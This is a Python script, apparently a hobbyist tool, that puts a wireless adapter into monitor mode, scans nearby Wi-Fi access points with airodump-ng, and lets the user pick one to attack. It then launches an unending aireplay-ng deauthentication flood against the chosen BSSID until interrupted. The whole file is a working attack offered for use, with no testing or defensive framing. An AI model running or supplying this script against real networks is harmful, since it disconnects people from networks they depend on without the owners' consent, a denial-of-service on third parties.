import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

# List to store active wireless networks
active_wireless_networks = []

# Function to check if ESSID is already listed
def check_for_essid(essid, lst):
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False
    return check_status

# Display banner
print(r"""______            _     _  ______                 _           _ 
                  
 ██████╗   ██╗   ██╗   ██╗           ██╗
██╔══██╗  ██║   ██║   ██║            ██║
██████╔╝  ██║   ██║   ██║            ██║
██╔═══╝   ██║   ██║   ██║            ██║
██║       ╚██████╔╝   ██╚██████╔╝    ██║
╚═╝        ╚═════╝    ╚═╝            ╚═╝
                 
                                      
""")

print("\n****************************************************")

# Superuser check
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()

# Move any existing .csv files to a backup folder
for file_name in os.listdir():
    if ".csv" in file_name:
        print("Moving existing .csv files to backup folder.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# Regex to find wireless interfaces named wlan0, wlan1, etc.
wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# Check if any WiFi adapter is found
if len(check_wifi_result) == 0:
    print("Please connect a WiFi controller and try again.")
    exit()

# Display available WiFi interfaces
print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Interface selection
while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices.")

hacknic = check_wifi_result[int(wifi_interface_choice)]

# Kill processes that may cause interference
print("Killing conflicting processes:")
subprocess.run(["sudo", "airmon-ng", "check", "kill"])

# Enable monitor mode
print("Enabling monitor mode on the selected interface:")
subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# Start scanning for access points and write output to CSV
print("Scanning for networks. Press Ctrl+C to stop and select a network.")
discover_access_points = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Parse CSV files and display networks
try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    csv_reader = csv.DictReader(csv_h, fieldnames=['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key'])
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

# Target network selection
while True:
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")

hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Set channel and start deauthentication attack
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
print("Starting deauthentication attack on selected network...")
subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Loop for attack until stopped by user
try:
    while True:
        print("Deauthenticating clients, press Ctrl+C to stop.")
        time.sleep(1)
except KeyboardInterrupt:
    print("\nStopping attack and restoring interface.")

# Stop monitor mode
subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
print("Thank you! Exiting now.")
